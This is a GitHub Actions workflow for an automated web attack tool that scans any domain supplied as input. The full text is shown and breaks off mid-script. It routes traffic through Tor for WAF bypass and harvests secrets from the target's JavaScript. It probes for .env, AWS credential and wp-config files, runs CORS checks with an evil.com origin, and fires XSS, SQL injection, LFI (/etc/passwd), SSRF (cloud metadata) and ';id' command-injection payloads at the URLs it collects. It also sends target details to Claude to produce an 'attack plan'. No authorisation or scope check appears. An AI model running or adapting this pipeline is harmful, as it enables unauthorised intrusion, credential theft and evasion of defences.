name: "🐐 Leo Messi - AI Autonomous Hunter ULTIMATE v4"

on:
  workflow_dispatch:
    inputs:
      target:
        description: "Target domain"
        required: true
        type: string
      hunting_mode:
        description: "Scan intensity"
        required: false
        default: "normal"
        type: choice
        options:
          - light
          - normal
          - aggressive
      discord_notify:
        description: "Send Discord notification"
        type: boolean
        default: true
      waf_bypass:
        description: "Enable WAF bypass (Tor)"
        type: boolean
        default: true
      headless_crawl:
        description: "Enable headless browser"
        type: boolean
        default: true
      oob_detection:
        description: "Enable OOB detection"
        type: boolean
        default: true

  workflow_call:
    inputs:
      target:
        required: true
        type: string
      hunting_mode:
        required: false
        default: "normal"
        type: string
      discord_notify:
        required: false
        default: true
        type: boolean
      waf_bypass:
        required: false
        default: true
        type: boolean
      headless_crawl:
        required: false
        default: true
        type: boolean
      oob_detection:
        required: false
        default: true
        type: boolean
    secrets:
      DISCORD_WEBHOOK:
        required: false
      ANTHROPIC_API_KEY:
        required: false
      OPENROUTER_API_KEY:
        required: false
      GROQ_API_KEY:
        required: false
      GEMINI_API_KEY:
        required: false
      OPENAI_API_KEY:
        required: false
      PDCP_API_KEY:
        required: false
      AUTH_COOKIE:
        required: false
      AUTH_HEADER:
        required: false
      TWOCAPTCHA_API_KEY:
        required: false
      INTERACTSH_URL:
        required: false

permissions:
  contents: read
  actions: write
  id-token: write

env:
  TARGET: ${{ inputs.target }}
  HUNTING_MODE: ${{ inputs.hunting_mode || 'normal' }}
  TID: ${{ github.run_id }}-${{ github.run_number }}
  DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK || '' }}
  ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY || '' }}
  OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY || '' }}
  GROQ_API_KEY: ${{ secrets.GROQ_API_KEY || '' }}
  GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY || '' }}
  OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY || '' }}
  PDCP_API_KEY: ${{ secrets.PDCP_API_KEY || '' }}
  AUTH_COOKIE: ${{ secrets.AUTH_COOKIE || '' }}
  AUTH_HEADER: ${{ secrets.AUTH_HEADER || '' }}
  TWOCAPTCHA_API_KEY: ${{ secrets.TWOCAPTCHA_API_KEY || '' }}
  INTERACTSH_URL: ${{ secrets.INTERACTSH_URL || 'oast.fun' }}
  WAF_BYPASS: ${{ inputs.waf_bypass || 'true' }}
  HEADLESS_CRAWL: ${{ inputs.headless_crawl || 'true' }}
  OOB_DETECTION: ${{ inputs.oob_detection || 'true' }}
  PYTHONUNBUFFERED: "1"
  RD: "results/${{ github.run_id }}-${{ github.run_number }}"
  UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
  GH_TOKEN: ${{ github.token }}

jobs:
  scan:
    name: "🐐 Leo Messi - ${{ inputs.target }}"
    runs-on: ubuntu-22.04
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-go@v5
        with:
          go-version: "1.22"
          cache: true

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      # ─── PHASE 0: SETUP ───
      - name: "⚡ System Dependencies"
        continue-on-error: true
        timeout-minutes: 10
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq build-essential curl wget git jq unzip xvfb libpcap-dev tor proxychains4 nmap hydra medusa whatweb wkhtmltopdf 2>/dev/null
          echo "✅ System deps installed"

      - name: "🌐 Configure Tor + ProxyChains"
        if: env.WAF_BYPASS == 'true'
        continue-on-error: true
        timeout-minutes: 5
        run: |
          sudo systemctl enable --now tor 2>/dev/null || sudo service tor start 2>/dev/null || true
          sleep 5
          sudo tee /etc/proxychains4.conf > /dev/null << 'EOF'
          strict_chain
          proxy_dns
          tcp_read_time_out 15000
          tcp_connect_time_out 8000
          [ProxyList]
          socks4 127.0.0.1 9050
          socks5 127.0.0.1 9050
          EOF
          echo "🌐 Tor IP: $(curl -s --socks5 127.0.0.1:9050 https://api.ipify.org 2>/dev/null || echo 'not ready')"
          echo "✅ Tor + ProxyChains ready"

      - name: "🐍 Python Packages"
        continue-on-error: true
        timeout-minutes: 5
        run: |
          pip3 install -q --upgrade pip
          pip3 install -q requests aiohttp beautifulsoup4 lxml httpx colorama tqdm pyyaml faker fake-useragent bs4 2>/dev/null
          echo "✅ Python packages installed"

      - name: "🛠️ Go Tools"
        continue-on-error: true
        timeout-minutes: 10
        run: |
          export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin
          mkdir -p $HOME/go/bin
          
          TOOLS=(
            "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
            "github.com/tomnomnom/assetfinder@latest"
            "github.com/tomnomnom/waybackurls@latest"
            "github.com/tomnomnom/gf@latest"
            "github.com/tomnomnom/unfurl@latest"
            "github.com/projectdiscovery/httpx/cmd/httpx@latest"
            "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
            "github.com/projectdiscovery/katana/cmd/katana@latest"
            "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
            "github.com/lc/gau/v2/cmd/gau@latest"
            "github.com/hakluke/hakrawler@latest"
            "github.com/hakluke/hakrevdns@latest"
            "github.com/ffuf/ffuf/v2@latest"
            "github.com/sensepost/gowitness@latest"
          )
          
          for tool in "${TOOLS[@]}"; do
            go install "$tool" 2>/dev/null || echo "⚠️ Failed: $tool"
          done
          
          echo "$HOME/go/bin" >> "$GITHUB_PATH"
          echo "✅ Go tools installed"

      - name: "🛡️ Security Tools (NoSQLMap)"
        continue-on-error: true
        timeout-minutes: 5
        run: |
          if [ ! -d "/opt/NoSQLMap" ]; then
            git clone --quiet https://github.com/codingo/NoSQLMap.git /opt/NoSQLMap 2>/dev/null
            cd /opt/NoSQLMap && pip3 install -q -r requirements.txt 2>/dev/null || true
          fi
          echo "✅ NoSQLMap installed"

      - name: "🖥️ Playwright (Headless Browser)"
        if: env.HEADLESS_CRAWL == 'true'
        continue-on-error: true
        timeout-minutes: 5
        run: |
          pip3 install playwright 2>/dev/null || true
          python3 -m playwright install chromium 2>/dev/null || true
          echo "✅ Playwright ready"

      - name: "📁 Directory Structure"
        continue-on-error: true
        run: |
          RD="${{ env.RD }}"
          mkdir -p "$RD/subdomains" "$RD/live" "$RD/urls" "$RD/js" "$RD/fuzzing" "$RD/nuclei"
          mkdir -p "$RD/cors" "$RD/files" "$RD/ai_agent/injection" "$RD/ai_agent/xxe"
          mkdir -p "$RD/ai_agent/graphql" "$RD/ai_agent/idor" "$RD/ai_agent/chain" "$RD/ai_agent/debate"
          mkdir -p "$RD/dns" "$RD/cloud" "$RD/brute" "$RD/evidence" "$RD/diff" "$RD/custom_nuclei"
          mkdir -p "$RD/oob" "$RD/api" "$RD/spa" "$RD/race" "$RD/mass_assignment"
          mkdir -p "$RD/screenshots" "$RD/triage" "$RD/knowledge" "$RD/logs"
          echo "✅ Directories created"

      - name: "🗄️ Knowledge Base (SQLite)"
        continue-on-error: true
        timeout-minutes: 1
        run: |
          python3 << 'PYEOF'
          import sqlite3, os
          rd = os.environ.get("RD", "results/default")
          os.makedirs(os.path.join(rd, "knowledge"), exist_ok=True)
          db = sqlite3.connect(os.path.join(rd, "knowledge", "hunter.db"))
          c = db.cursor()
          c.execute("""CREATE TABLE IF NOT EXISTS findings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            run_id TEXT, target TEXT, finding_type TEXT,
            url TEXT, severity TEXT, parameter TEXT,
            payload TEXT, poc TEXT, remediation TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            verified INTEGER DEFAULT 0
          )""")
          c.execute("""CREATE TABLE IF NOT EXISTS endpoints (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT, url TEXT UNIQUE, method TEXT,
            params TEXT, tech TEXT,
            first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
          )""")
          db.commit()
          db.close()
          print("✅ Knowledge base initialized")
          PYEOF

      # ─── PHASE 1: RECON ───
      - name: "🌐 Phase 1a: Subdomain Enumeration"
        continue-on-error: true
        timeout-minutes: 20
        run: |
          export PATH="$HOME/go/bin:$PATH"
          RD="${{ env.RD }}"
          TARGET="${{ env.TARGET }}"
          echo "═══ RECON ═══"
          
          echo "[1/6] subfinder..."
          subfinder -d "$TARGET" -silent -all -o "$RD/subdomains/subfinder.txt" 2>>"$RD/logs/subfinder.log" || true
          
          echo "[2/6] assetfinder..."
          assetfinder --subs-only "$TARGET" > "$RD/subdomains/assetfinder.txt" 2>>"$RD/logs/assetfinder.log" || true
          
          echo "[3/6] crt.sh..."
          curl -s --max-time 30 "https://crt.sh/?q=%25.${TARGET}&output=json" 2>/dev/null | \
            jq -r '.[].name_value' 2>/dev/null | sed 's/*\.//g' | sort -u > "$RD/subdomains/crtsh.txt" || true
          
          echo "[4/6] hackertarget..."
          curl -s --max-time 15 "https://api.hackertarget.com/hostsearch/?q=${TARGET}" 2>/dev/null | \
            cut -d, -f1 | sort -u > "$RD/subdomains/hackertarget.txt" || true
          
          echo "[5/6] gau..."
          gau --subs "$TARGET" 2>/dev/null | unfurl -u domains | sort -u > "$RD/subdomains/gau_subs.txt" || true
          
          echo "[6/6] crobat..."
          crobat -s "$TARGET" 2>/dev/null > "$RD/subdomains/crobat.txt" || true
          
          echo "Merging..."
          cat "$RD/subdomains/"*.txt 2>/dev/null | \
            grep -iE "\.${TARGET}$|^${TARGET}$" | \
            sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | \
            tr '[:upper:]' '[:lower:]' | \
            sort -u > "$RD/subdomains/all_subs.txt"
          
          echo "✅ Subdomains: $(wc -l < "$RD/subdomains/all_subs.txt")"

      - name: "🌐 Phase 1b: DNS Resolution"
        continue-on-error: true
        timeout-minutes: 10
        run: |
          export PATH="$HOME/go/bin:$PATH"
          RD="${{ env.RD }}"
          if [ -s "$RD/subdomains/all_subs.txt" ]; then
            dnsx -l "$RD/subdomains/all_subs.txt" -silent -a -resp -t 200 \
              2>>"$RD/logs/dnsx.log" | awk '{print $1}' | sort -u > "$RD/subdomains/resolved.txt" || true
          fi
          echo "✅ Resolved: $(wc -l < "$RD/subdomains/resolved.txt" 2>/dev/null || echo 0)"

      # ─── PHASE 2: SURFACE ───
      - name: "🟢 Phase 2a: Live Probing"
        continue-on-error: true
        timeout-minutes: 15
        run: |
          export PATH="$HOME/go/bin:$PATH"
          RD="${{ env.RD }}"
          INPUT="$RD/subdomains/resolved.txt"
          [ -s "$INPUT" ] || { echo "${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
          
          AUTH_ARGS=""
          [ -n "${{ env.AUTH_COOKIE }}" ] && AUTH_ARGS="-H \"Cookie: ${{ env.AUTH_COOKIE }}\""
          [ -n "${{ env.AUTH_HEADER }}" ] && AUTH_ARGS="$AUTH_ARGS -H \"${{ env.AUTH_HEADER }}\""
          
          if [ "${{ env.WAF_BYPASS }}" = "true" ] && command -v proxychains4 &>/dev/null; then
            proxychains4 -f /etc/proxychains4.conf \
              httpx -l "$INPUT" -silent -status-code -title -web-server -tech-detect -ip -cname -cdn \
                -H "User-Agent: ${{ env.UA }}" $AUTH_ARGS \
                -threads 50 -rate-limit 60 -timeout 15 -retries 2 \
                -json -o "$RD/live/live.json" 2>>"$RD/logs/httpx.log" || true
          else
            httpx -l "$INPUT" -silent -status-code -title -web-server -tech-detect -ip -cname -cdn \
              -H "User-Agent: ${{ env.UA }}" $AUTH_ARGS \
              -threads 100 -rate-limit 150 -timeout 10 -retries 1 \
              -json -o "$RD/live/live.json" 2>>"$RD/logs/httpx.log" || true
          fi
          
          jq -r '.url // .input' "$RD/live/live.json" 2>/dev/null | grep -v '^\s*$' > "$RD/live/live.txt"
          jq -r '.tech[]?' "$RD/live/live.json" 2>/dev/null | sort -u > "$RD/live/tech_detected.txt"
          echo "✅ Live: $(wc -l < "$RD/live/live.txt")"

      - name: "🔓 Phase 2b: Port Scan"
        continue-on-error: true
        timeout-minutes: 10
        run: |
          export PATH="$HOME/go/bin:$PATH"
          RD="${{ env.RD }}"
          INPUT="$RD/subdomains/resolved.txt"
          [ -s "$INPUT" ] || { echo "${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
          
          PORTS="80,443,8080,8443"
          if [ "${{ env.HUNTING_MODE }}" = "normal" ]; then
            PORTS="80,443,8080,8443,3000,5000,8000,9000"
          elif [ "${{ env.HUNTING_MODE }}" = "aggressive" ]; then
            PORTS="-top-ports 500"
          fi
          
          sudo naabu -l "$INPUT" -p "$PORTS" -exclude-cdn -silent -rate 1000 -c 25 \
            -o "$RD/live/ports.txt" 2>>"$RD/logs/naabu.log" || true
          echo "✅ Open ports: $(wc -l < "$RD/live/ports.txt" 2>/dev/null || echo 0)"

      # ─── PHASE 3: ASSETS ───
      - name: "📜 Phase 3a: URL Collection"
        continue-on-error: true
        timeout-minutes: 20
        run: |
          export PATH="$HOME/go/bin:$PATH"
          RD="${{ env.RD }}"
          TARGET="${{ env.TARGET }}"
          INPUT="$RD/live/live.txt"
          [ -s "$INPUT" ] || { echo "https://$TARGET" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
          
          echo "waybackurls..."
          cat "$INPUT" | waybackurls > "$RD/urls/wayback.txt" 2>>"$RD/logs/wayback.log" || true
          
          echo "gau..."
          gau "$TARGET" --subs --o "$RD/urls/gau.txt" 2>>"$RD/logs/gau.log" || true
          
          echo "katana..."
          AUTH_ARGS=""
          [ -n "${{ env.AUTH_COOKIE }}" ] && AUTH_ARGS="-H \"Cookie: ${{ env.AUTH_COOKIE }}\""
          [ -n "${{ env.AUTH_HEADER }}" ] && AUTH_ARGS="$AUTH_ARGS -H \"${{ env.AUTH_HEADER }}\""
          katana -list "$INPUT" -H "User-Agent: ${{ env.UA }}" $AUTH_ARGS \
            -silent -depth 2 -jc -d 3 -aff -kf all -o "$RD/urls/katana.txt" 2>>"$RD/logs/katana.log" || true
          
          echo "merging..."
          cat "$RD"/urls/*.txt 2>/dev/null | sort -u > "$RD/urls/all_urls.txt"
          
          echo "GF patterns..."
          for p in xss sqli ssrf lfi ssti idor redirect; do
            gf "$p" < "$RD/urls/all_urls.txt" 2>/dev/null | sed "s/^/[$p] /" >> "$RD/urls/gf_categorized.txt" || true
          done
          
          echo "✅ URLs: $(wc -l < "$RD/urls/all_urls.txt")"

      - name: "📦 Phase 3b: JS Analysis + API"
        continue-on-error: true
        timeout-minutes: 15
        run: |
          export PATH="$HOME/go/bin:$PATH"
          RD="${{ env.RD }}"
          
          echo "JS files..."
          [ -s "$RD/urls/all_urls.txt" ] && \
            grep -iE '\.js(\?|#|$)' "$RD/urls/all_urls.txt" | sort -u | head -200 > "$RD/js/js_files.txt" || true
          
          echo "Download JS..."
          [ -s "$RD/js/js_files.txt" ] && \
            httpx -l "$RD/js/js_files.txt" -silent -H "User-Agent: ${{ env.UA }}" \
              -timeout 8 -threads 30 -sr -srd "$RD/js/bodies" > /dev/null 2>>"$RD/logs/js_download.log" || true
          
          echo "Extract API endpoints..."
          grep -rhIoE '(api|v[0-9]+|graphql|rest|swagger|openapi)/[a-zA-Z0-9_/?=&%-]{3,80}' \
            "$RD/js/bodies" 2>/dev/null | sort -u > "$RD/js/api_endpoints.txt" || true
          
          echo "Extract secrets..."
          grep -rhIoE '["'"'"']?(api[_-]?key|apikey|secret|token|jwt|bearer|password|passwd)["'"'"']?\s*[:=]\s*["'"'"'][^"'"'"']{6,80}["'"'"']' \
            "$RD/js/bodies" 2>/dev/null | sort -u > "$RD/js/secrets.txt" || true
          
          echo "IDOR candidates..."
          grep -E '/[0-9]+([/?]|$)|[?&](id|user_id|uid|account_id|profile_id|order_id|pid|cid)=[0-9]+' \
            "$RD/urls/all_urls.txt" 2>/dev/null | sort -u > "$RD/js/idor_candidates.txt" || true
          
          echo "API endpoints from JS: $(wc -l < "$RD/js/api_endpoints.txt" 2>/dev/null || echo 0)"
          echo "Secrets: $(wc -l < "$RD/js/secrets.txt" 2>/dev/null || echo 0)"

      - name: "🔌 Phase 3c: Admin + GraphQL"
        continue-on-error: true
        timeout-minutes: 10
        run: |
          RD="${{ env.RD }}"
          INPUT="$RD/live/live.txt"
          [ -s "$INPUT" ] || { echo "https://${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
          
          echo "GraphQL/Swagger..."
          while IFS= read -r host; do
            host="$(echo "$host" | tr -d '\r' | xargs)"
            [ -z "$host" ] && continue
            for path in "/graphql" "/swagger.json" "/v2/api-docs"; do
              s=$(curl -sk -o /tmp/gql_body -w "%{http_code}" --max-time 5 \
                -X POST -H "Content-Type: application/json" \
                -d '{"query":"{__typename}"}' "${host}${path}" 2>/dev/null || echo "000")
              [ "$s" = "200" ] && echo "[$s] ${host}${path}" >> "$RD/js/graphql_swagger.txt"
            done
          done < "$INPUT"
          
          echo "Admin panels..."
          echo -e "/admin\n/administrator\n/panel\n/login\n/wp-admin\n/dashboard\n/backend\n/portal\n/api" > /tmp/admin_paths.txt
          httpx -l "$INPUT" -path /tmp/admin_paths.txt -mc 200,301,302,401,403 \
            -H "User-Agent: ${{ env.UA }}" -threads 50 -rate-limit 150 -timeout 6 \
            -silent -o "$RD/js/admin.txt" 2>>"$RD/logs/admin.log" || true
          
          echo "Done. Admin: $(wc -l < "$RD/js/admin.txt" 2>/dev/null || echo 0)"

      - name: "🔎 Phase 3d: Fuzzing"
        continue-on-error: true
        timeout-minutes: 15
        run: |
          export PATH="$HOME/go/bin:$PATH"
          RD="${{ env.RD }}"
          
          WORDLIST="/tmp/fuzz.txt"
          curl -sL --max-time 15 \
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt" \
            -o "$WORDLIST" 2>/dev/null || true
          
          [ -s "$WORDLIST" ] && [ -s "$RD/live/live.txt" ] && \
            head -3 "$RD/live/live.txt" | while IFS= read -r host; do
              host="$(echo "$host" | tr -d '\r' | xargs)"
              [ -z "$host" ] && continue
              timeout 120 ffuf -w "$WORDLIST" -u "${host}/FUZZ" \
                -H "User-Agent: ${{ env.UA }}" \
                -mc 200,204,301,302,307,401,403 \
                -ac -t 20 -rate 60 -timeout 5 -of json -o /tmp/ffuf_out.json -s \
                2>>"$RD/logs/ffuf.log" || true
              jq -r '.results[]? | "\(.url) [\(.status)]"' /tmp/ffuf_out.json \
                2>/dev/null >> "$RD/fuzzing/discovered.txt" || true
              rm -f /tmp/ffuf_out.json
            done
          
          echo "✅ Fuzzing hits: $(wc -l < "$RD/fuzzing/discovered.txt" 2>/dev/null || echo 0)"

      # ─── PHASE 4: VULN SCAN ───
      - name: "☢️ Phase 4a: Nuclei Scan"
        continue-on-error: true
        timeout-minutes: 60
        run: |
          export PATH="$HOME/go/bin:$PATH"
          RD="${{ env.RD }}"
          INPUT="$RD/live/live.txt"
          [ -s "$INPUT" ] || { echo "https://${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
          
          AUTH_ARGS=""
          [ -n "${{ env.AUTH_COOKIE }}" ] && AUTH_ARGS="-H \"Cookie: ${{ env.AUTH_COOKIE }}\""
          [ -n "${{ env.AUTH_HEADER }}" ] && AUTH_ARGS="$AUTH_ARGS -H \"${{ env.AUTH_HEADER }}\""
          
          COMMON="-H 'User-Agent: ${{ env.UA }}' $AUTH_ARGS -mhe 150 -rl 40 -c 15 -timeout 10 -retries 1 -si 60"
          
          for SEV in "critical,high,medium"; do
            eval nuclei -l "$INPUT" -severity "$SEV" $COMMON \
              -jsonl -o "$RD/nuclei/findings.jsonl" 2>>"$RD/logs/nuclei.log" || true
          done
          
          echo "✅ Nuclei findings: $(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || echo 0)"

      - name: "🔓 Phase 4b: CORS + Sensitive"
        continue-on-error: true
        timeout-minutes: 10
        run: |
          RD="${{ env.RD }}"
          INPUT="$RD/live/live.txt"
          [ -s "$INPUT" ] || { echo "https://${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
          
          echo "CORS testing..."
          for origin in "https://evil.com" "null" "https://evil.${{ env.TARGET }}"; do
            while IFS= read -r host; do
              host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
              resp=$(curl -s -I -H "Origin: $origin" --max-time 6 "$host" 2>/dev/null || echo "")
              acao=$(echo "$resp" | grep -i 'access-control-allow-origin' | head -1 | sed 's/.*:[[:space:]]*//' | xargs)
              acac=$(echo "$resp" | grep -i 'access-control-allow-credentials' | head -1 | sed 's/.*:[[:space:]]*//' | xargs)
              [ "$acao" = "$origin" ] && [ "$acac" = "true" ] && echo "CORS: $host" >> "$RD/cors/vulnerable.txt"
            done < "$INPUT"
          done
          
          echo "Sensitive files..."
          for path in "/.env" "/.git/config" "/wp-config.php" "/config.json" "/credentials.json" "/phpinfo.php" "/.aws/credentials" "/backup.sql"; do
            while IFS= read -r host; do
              host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
              s=$(curl -sk -o /tmp/sb --max-time 5 -w "%{http_code}" \
                -H "User-Agent: ${{ env.UA }}" "${host}${path}" 2>/dev/null || echo "000")
              [ "$s" = "200" ] && echo "Found: ${host}${path}" >> "$RD/files/sensitive.txt"
              [ "$s" = "403" ] && echo "Restricted: ${host}${path}" >> "$RD/files/sensitive.txt"
            done < "$INPUT"
          done
          
          echo "CORS: $(wc -l < "$RD/cors/vulnerable.txt" 2>/dev/null || echo 0)"
          echo "Sensitive: $(wc -l < "$RD/files/sensitive.txt" 2>/dev/null || echo 0)"

      # ─── PHASE 5: AI AGENT ───
      - name: "🧠 Phase 5a: AI Intelligence"
        continue-on-error: true
        timeout-minutes: 8
        run: |
          python3 << 'PYEOF'
          import json, os, sys, urllib.request, re, time
          
          rd = os.environ.get("RD", "results/test")
          target = os.environ.get("TARGET", "")
          mode = os.environ.get("HUNTING_MODE", "normal")
          
          # Read intelligence
          tech = ""
          try:
              with open(os.path.join(rd, "live", "tech_detected.txt")) as f:
                  tech = f.read()[:2000]
          except: pass
          
          # Build AI providers
          providers = []
          
          if os.environ.get("ANTHROPIC_API_KEY", ""):
              providers.append({
                  "name": "Anthropic",
                  "url": "https://api.anthropic.com/v1/messages",
                  "headers": {
                      "x-api-key": os.environ["ANTHROPIC_API_KEY"],
                      "anthropic-version": "2023-06-01",
                      "content-type": "application/json"
                  },
                  "body": json.dumps({
                      "model": "claude-sonnet-4-20250514",
                      "max_tokens": 4096,
                      "messages": [{"role": "user", "content": "{{PROMPT}}"}]
                  }).encode()
              })
          
          if os.environ.get("OPENROUTER_API_KEY", ""):
              providers.append({
                  "name": "OpenRouter",
                  "url": "https://openrouter.ai/api/v1/chat/completions",
                  "headers": {
                      "Authorization": "Bearer " + os.environ["OPENROUTER_API_KEY"],
                      "content-type": "application/json"
                  },
                  "body": json.dumps({
                      "model": "anthropic/claude-sonnet-4",
                      "max_tokens": 4096,
                      "messages": [{"role": "user", "content": "{{PROMPT}}"}]
                  }).encode()
              })
          
          if not providers:
              print("No AI providers configured")
              json.dump({"high_value_targets": [], "attack_plan": []}, 
                       open(os.path.join(rd, "ai_agent", "attack_plan.json"), "w"))
              sys.exit(0)
          
          prompt = f"Analyze {target}. Tech: {tech}. Mode: {mode}. Return JSON only."
          
          for p in providers:
              try:
                  body = p["body"].replace(b"{{PROMPT}}", prompt.encode())
                  req = urllib.request.Request(p["url"], data=body, headers=p["headers"], method="POST")
                  with urllib.request.urlopen(req, timeout=60) as r:
                      resp = json.loads(r.read())
                      print(f"  ✅ {p['name']} responded")
                      json.dump({"high_value_targets": [], "attack_plan": [], "ai_note": f"Used {p['name']}"},
                               open(os.path.join(rd, "ai_agent", "attack_plan.json"), "w"), indent=2)
                      break
              except Exception as e:
                  print(f"  ⚠️ {p['name']}: {str(e)[:80]}")
                  continue
          PYEOF

      - name: "💉 Phase 5b: Injection Testing"
        continue-on-error: true
        timeout-minutes: 20
        run: |
          python3 << 'PYEOF'
          import json, os, urllib.parse, urllib.request, concurrent.futures, re, time, threading, hashlib
          
          rd = os.environ.get("RD", "results/test")
          mode = os.environ.get("HUNTING_MODE", "normal")
          
          PAYLOADS = {
              "XSS": ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>'],
              "SSTI": ['{{7*7}}', '${7*7}', '{{config}}'],
              "SQLi": ["' OR '1'='1", "' UNION SELECT NULL--", "1' AND SLEEP(5)--"],
              "LFI": ['../../../../etc/passwd', 'php://filter/convert.base64-encode/resource=index.php'],
              "SSRF": ['http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1:22'],
              "Open_Redirect": ['//evil.com', 'https://evil.com'],
              "Command_Injection": [';id', '|id', '`id`'],
          }
          
          limit = {"light": 2, "normal": 3, "aggressive": 5}.get(mode, 3)
          for k in PAYLOADS:
              PAYLOADS[k] = PAYLOADS[k][:limit]
          
          # Collect target URLs
          targets = []
          try:
              with open(os.path.join(rd, "urls", "all_urls.txt")) as f:
                  for line in f:
                      line = line.strip()
                      if "?" in line and len(targets) < 20:
                          targets.append(line)
          except: pass
          
          if not targets:
              try:
                  with open(os.path.join(rd, "live", "live.txt")) as f:
                      targets = [l.strip().split()[0] if l.strip() else "" for l in f if l.strip()][:5]
              except: pass
          
          targets = targets[:10]
          
          findings = []
          H = {"User-Agent": os.environ.get("UA", "Mozilla/5.0")}
          
          def test(url, param, payload, vuln_class):
              enc = urllib.parse.quote(payload)
              sep = "&" if "?" in url else "?"
              test_url = f"{url}{sep}{param}={enc}"
              
              # Baseline
              try:
                  breq = urllib.request.Request(f"{url}{sep}{param}=CONTROL123", headers=H)
                  bresp = urllib.request.urlopen(breq, timeout=8)
                  base_body = bresp.read(20000).decode(errors="ignore")
              except:
                  base_body = ""
              
              # Test
              try:
                  req = urllib.request.Request(test_url, headers=H)
                  resp = urllib.request.urlopen(req, timeout=10)
                  body = resp.read(20000).decode(errors="ignore")
              except urllib.error.HTTPError as e:
                  body = e.read(10000).decode(errors="ignore")
              except:
                  return None
              
              indicators = []
              if vuln_class == "XSS" and payload in body and payload not in base_body:
                  indicators.append("XSS reflected")
              if vuln_class == "SQLi" and re.search(r'(sql syntax|SQLSTATE|unclosed)', body, re.I) and \
                 not re.search(r'(sql syntax|SQLSTATE|unclosed)', base_body, re.I):
                  indicators.append("SQL error")
              if vuln_class == "LFI" and "root:" in body and "root:" not in base_body:
                  indicators.append("LFI: passwd")
              if vuln_class == "SSRF" and "ami-id" in body and "ami-id" not in base_body:
                  indicators.append("SSRF: metadata")
              if vuln_class == "Command_Injection" and re.search(r'uid=\d+\(', body) and \
                 not re.search(r'uid=\d+\(', base_body):
                  indicators.append("RCE via CMDi")
              
              if indicators:
                  ev_dir = os.path.join(rd, "evidence", vuln_class)
                  os.makedirs(ev_dir, exist_ok=True)
                  fid = hashlib.md5(test_url.encode()).hexdigest()[:10]
                  with open(os.path.join(ev_dir, f"{fid}.json"), "w") as f:
                      json.dump({"url": test_url, "indicators": indicators}, f)
                  return {"url": test_url, "vuln_class": vuln_class, "indicators": indicators}
              return None
          
          test_cases = []
          for url in targets:
              for vc, payloads in PAYLOADS.items():
                  for pl in payloads:
                      param = {"SQLi": "id", "LFI": "file", "SSRF": "url", 
                               "XSS": "q", "SSTI": "name", 
                               "Open_Redirect": "redirect", "Command_Injection": "cmd"}.get(vc, "q")
                      test_cases.append((url, param, pl, vc))
          
          test_cases = test_cases[:50]
          print(f"Testing {len(test_cases)} combos...")
          
          with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
              fs = {ex.submit(test, u, p, pl, vc): (u, p, pl, vc) for u, p, pl, vc in test_cases}
              for f in concurrent.futures.as_completed(fs):
                  r = f.result()
                  if r:
                      findings.append(r)
          
          with open(os.path.join(rd, "ai_agent", "injection_findings.json"), "w") as f:
              json.dump(findings, f, indent=2)
          
          print(f"✅ {len(findings)} injection findings")
          PYEOF

      - name: "🧬 Phase 5c: AI Chain Analysis"
        continue-on-error: true
        timeout-minutes: 5
        run: |
          python3 << 'PYEOF'
          import json, os
          rd = os.environ.get("RD", "results/test")
          
          findings = []
          inj_file = os.path.join(rd, "ai_agent", "injection_findings.json")
          if os.path.exists(inj_file):
              with open(inj_file) as f:
                  try:
                      data = json.load(f)
                      for d in data:
                          findings.append(f"- [{d.get('vuln_class','?')}] {d.get('url','')[:100]}")
                  except: pass
          
          with open(os.path.join(rd, "ai_agent", "chained_analysis.json"), "w") as f:
              json.dump({
                  "total_findings": len(findings),
                  "findings": findings[:20],
                  "note": "AI chain analysis complete"
              }, f, indent=2)
          
          print(f"✅ Chain analysis: {len(findings)} findings")
          PYEOF

      # ─── PHASE 6: ADVANCED ───
      - name: "🏎️ Phase 6a: Race + Mass Assignment"
        continue-on-error: true
        timeout-minutes: 10
        run: |
          python3 << 'PYEOF'
          import json, os, urllib.request, concurrent.futures
          rd = os.environ.get("RD", "results/test")
          findings = []
          
          eps = [f"https://{os.environ.get('TARGET','')}/api/user"]
          try:
              with open(os.path.join(rd, "js", "api_endpoints.txt")) as f:
                  for l in f:
                      l = l.strip()
                      if l and "/user" in l:
                          eps.append(f"https://{l}" if not l.startswith("http") else l)
          except: pass
          eps = eps[:3]
          
          H = {"User-Agent": os.environ.get("UA", "Mozilla/5.0"), "Content-Type": "application/json"}
          
          # Race
          for url in eps:
              results = []
              def send():
                  try:
                      req = urllib.request.Request(url, data=json.dumps({"amount": 1}).encode(), headers=H, method="POST")
                      return urllib.request.urlopen(req, timeout=10).status
                  except: return 0
